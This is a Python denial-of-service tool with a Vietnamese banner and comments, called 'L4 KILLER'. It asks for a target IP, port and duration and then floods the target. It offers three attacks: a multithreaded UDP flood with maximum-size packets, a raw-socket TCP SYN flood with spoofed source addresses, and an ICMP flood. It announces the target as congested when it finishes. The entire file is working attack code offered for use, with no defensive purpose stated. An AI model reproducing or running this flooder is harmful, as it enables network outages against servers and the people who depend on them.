#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
L4 KILLER - IPv4 CONGESTION FLOOD
GÂY TẮC NGHẼN ĐƯỜNG TRUYỀN - LÀM NGẬP BĂNG THÔNG
"""

import socket
import threading
import time
import random
import sys
import os
import struct
from concurrent.futures import ThreadPoolExecutor

# ==================== CẤU HÌNH ====================
THREADS = 1000
PACKET_SIZE = 65507  # Max UDP size
DURATION = 60

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
    print(f"""{Colors.RED}
╔══════════════════════════════════════════════════════════════════╗
║              💀 L4 KILLER - IPv4 CONGESTION FLOOD 💀             ║
║              GÂY TẮC NGHẼN - LÀM NGẬP BĂNG THÔNG                ║
╠══════════════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}[+] UDP Flood 65KB - Tốn băng thông tối đa{Colors.RED}                    ║
║  {Colors.YELLOW}[+] TCP SYN Flood - Tốn connection table{Colors.RED}                      ║
║  {Colors.YELLOW}[+] ICMP Flood - Gây ngập ping{Colors.RED}                                ║
║  {Colors.YELLOW}[+] Spoof IP - Tránh bị chặn{Colors.RED}                                 ║
╚══════════════════════════════════════════════════════════════════╝
{Colors.RESET}""")

def random_ip():
    """Tạo IP giả ngẫu nhiên"""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def random_port():
    """Tạo port giả"""
    return random.randint(1024, 65535)

# ==================== UDP CONGESTION FLOOD ====================
class UDPCongestionFlood:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.running = True
        self.stats = {'packets': 0, 'bytes': 0}
        self.lock = threading.Lock()
        
    def create_payload(self, size):
        """Tạo payload đa dạng"""
        payload = bytearray()
        
        # Thêm header giả
        payload.extend(struct.pack('>I', random.randint(0, 0xFFFFFFFF)))
        payload.extend(struct.pack('>I', random.randint(0, 0xFFFFFFFF)))
        
        # Data random
        payload.extend(os.urandom(size - 8))
        
        return bytes(payload)
    
    def worker(self, wid):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
            
            # Bind với IP giả (nếu có thể)
            try:
                sock.bind((random_ip(), random_port()))
            except:
                pass
                
        except Exception as e:
            return
        
        sent = 0
        bytes_sent = 0
        end_time = time.time() + DURATION
        
        # Đa dạng kích thước packet
        sizes = [65507, 32768, 16384, 8192, 4096, 2048, 1024, 512]
        
        while self.running and time.time() < end_time:
            try:
                # Chọn kích thước ngẫu nhiên
                size = random.choice(sizes)
                payload = self.create_payload(size)
                
                sock.sendto(payload, (self.ip, self.port))
                sent += 1
                bytes_sent += len(payload)
                
            except Exception:
                pass
            
            # Gửi liên tục không delay
            if sent % 100 == 0:
                time.sleep(0.0001)
        
        sock.close()
        with self.lock:
            self.stats['packets'] += sent
            self.stats['bytes'] += bytes_sent
    
    def start(self, threads=THREADS):
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            threads_list.append(t)
        return threads_list
    
    def stop(self):
        self.running = False

# ==================== TCP SYN FLOOD ====================
class TCPSYNFlood:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.running = True
        self.stats = {'packets': 0}
        self.lock = threading.Lock()
        
    def create_syn_packet(self, src_ip, src_port):
        """Tạo gói SYN chuẩn"""
        # IP Header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40  # IP header + TCP header
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(self.ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
            ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
            ip_saddr, ip_daddr)
        
        # TCP Header
        tcp_sport = src_port
        tcp_dport = self.port
        tcp_seq = random.randint(0, 2**32 - 1)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_flags = 0x02  # SYN flag
        tcp_window = random.randint(1024, 65535)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_sport, tcp_dport, tcp_seq, tcp_ack_seq,
            (tcp_doff << 4), tcp_flags, tcp_window,
            tcp_check, tcp_urg_ptr)
        
        return ip_header + tcp_header
    
    def worker(self, wid):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print(f"{Colors.RED}[!] SYN Flood cần root! Chạy với sudo{Colors.RESET}")
            return
        except:
            return
        
        sent = 0
        end_time = time.time() + DURATION
        
        while self.running and time.time() < end_time:
            try:
                src_ip = random_ip()
                src_port = random_port()
                packet = self.create_syn_packet(src_ip, src_port)
                sock.sendto(packet, (self.ip, 0))
                sent += 1
            except:
                pass
        
        sock.close()
        with self.lock:
            self.stats['packets'] += sent
    
    def start(self, threads=200):
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            threads_list.append(t)
        return threads_list
    
    def stop(self):
        self.running = False

# ==================== ICMP FLOOD (PING OF DEATH) ====================
class ICMPFlood:
    def __init__(self, ip):
        self.ip = ip
        self.running = True
        self.stats = {'packets': 0}
        self.lock = threading.Lock()
        
    def create_icmp_packet(self, src_ip):
        """Tạo gói ICMP Echo Request"""
        # IP Header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 60
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_ICMP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(self.ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
            ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
            ip_saddr, ip_daddr)
        
        # ICMP Header
        icmp_type = 8  # Echo Request
        icmp_code = 0
        icmp_check = 0
        icmp_id = random.randint(1, 65535)
        icmp_seq = random.randint(1, 65535)
        
        icmp_header = struct.pack('!BBHHH',
            icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
        
        # Data
        data = os.urandom(32)
        
        return ip_header + icmp_header + data
    
    def worker(self, wid):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            return
        
        sent = 0
        end_time = time.time() + DURATION
        
        while self.running and time.time() < end_time:
            try:
                src_ip = random_ip()
                packet = self.create_icmp_packet(src_ip)
                sock.sendto(packet, (self.ip, 0))
                sent += 1
            except:
                pass
        
        sock.close()
        with self.lock:
            self.stats['packets'] += sent
    
    def start(self, threads=100):
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            threads_list.append(t)
        return threads_list
    
    def stop(self):
        self.running = False

# ==================== MAIN ====================
def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    
    print(f"{Colors.CYAN}")
    ip = input("🎯 Target IP: ").strip()
    port = int(input("🔌 Target Port: ").strip())
    duration = int(input("⏱️  Attack Duration (seconds): ").strip())
    
    global DURATION
    DURATION = duration
    
    print(f"\n{Colors.YELLOW}[!] Chọn phương thức:{Colors.RESET}")
    print(f"   1. UDP Congestion Flood (nặng nhất - khuyến nghị)")
    print(f"   2. TCP SYN Flood (cần root, mạnh)")
    print(f"   3. ICMP Flood (ping of death)")
    print(f"   4. ALL (tấn công tổng lực)")
    
    choice = input(f"\n{Colors.CYAN}Chọn [1-4]: {Colors.RESET}").strip() or "1"
    
    print(f"\n{Colors.YELLOW}[!] KHỞI TẠO...{Colors.RESET}")
    
    udp = None
    syn = None
    icmp = None
    
    if choice in ['1', '4']:
        udp = UDPCongestionFlood(ip, port)
        print(f"{Colors.GREEN}[+] UDP Congestion Flood started (65KB/packet){Colors.RESET}")
    
    if choice in ['2', '4']:
        syn = TCPSYNFlood(ip, port)
        print(f"{Colors.GREEN}[+] TCP SYN Flood started{Colors.RESET}")
    
    if choice in ['3', '4']:
        icmp = ICMPFlood(ip)
        print(f"{Colors.GREEN}[+] ICMP Flood started{Colors.RESET}")
    
    all_threads = []
    if udp:
        all_threads.extend(udp.start(threads=THREADS))
    if syn:
        all_threads.extend(syn.start(threads=200))
    if icmp:
        all_threads.extend(icmp.start(threads=100))
    
    print(f"\n{Colors.RED}{'='*60}{Colors.RESET}")
    print(f"{Colors.RED}🔥 CONGESTING {ip}:{port} FOR {DURATION}s 🔥{Colors.RESET}")
    print(f"{Colors.RED}{'='*60}{Colors.RESET}\n")
    
    start_time = time.time()
    
    try:
        while time.time() - start_time < DURATION:
            time.sleep(1)
            elapsed = time.time() - start_time
            
            udp_packets = udp.stats['packets'] if udp else 0
            udp_bytes = udp.stats['bytes'] if udp else 0
            syn_packets = syn.stats['packets'] if syn else 0
            icmp_packets = icmp.stats['packets'] if icmp else 0
            
            total = udp_packets + syn_packets + icmp_packets
            mbps = udp_bytes / elapsed / 1024 / 1024 if elapsed > 0 and udp_bytes > 0 else 0
            
            bar_len = 35
            filled = int(bar_len * (elapsed / DURATION))
            bar = '█' * filled + '░' * (bar_len - filled)
            
            sys.stdout.write(f"\r[{bar}] {elapsed:.0f}/{DURATION}s | "
                           f"UDP: {udp_packets:,} | SYN: {syn_packets:,} | "
                           f"ICMP: {icmp_packets:,} | BW: {mbps:.1f} MB/s")
            sys.stdout.flush()
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Dừng bởi người dùng{Colors.RESET}")
    
    if udp: udp.stop()
    if syn: syn.stop()
    if icmp: icmp.stop()
    
    elapsed = time.time() - start_time
    udp_total = udp.stats['packets'] if udp else 0
    udp_bytes_total = udp.stats['bytes'] if udp else 0
    syn_total = syn.stats['packets'] if syn else 0
    icmp_total = icmp.stats['packets'] if icmp else 0
    
    print(f"\n\n{Colors.GREEN}{'='*60}{Colors.RESET}")
    print(f"{Colors.GREEN}✅ CONGESTION FINISHED!{Colors.RESET}")
    print(f"{Colors.GREEN}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}📊 UDP Packets: {udp_total:,} ({udp_bytes_total/1024/1024:.1f} MB){Colors.RESET}")
    print(f"{Colors.CYAN}📊 SYN Packets: {syn_total:,}{Colors.RESET}")
    print(f"{Colors.CYAN}📊 ICMP Packets: {icmp_total:,}{Colors.RESET}")
    print(f"{Colors.CYAN}📊 Total: {udp_total + syn_total + icmp_total:,} packets{Colors.RESET}")
    print(f"{Colors.CYAN}⏱️  Duration: {elapsed:.1f}s{Colors.RESET}")
    print(f"{Colors.RED}{'='*60}{Colors.RESET}")
    print(f"{Colors.RED}🔥 Server {ip} ĐÃ BỊ TẮC NGHẼN! 🔥{Colors.RESET}")
    print(f"{Colors.GREEN}{'='*60}{Colors.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Exiting...{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")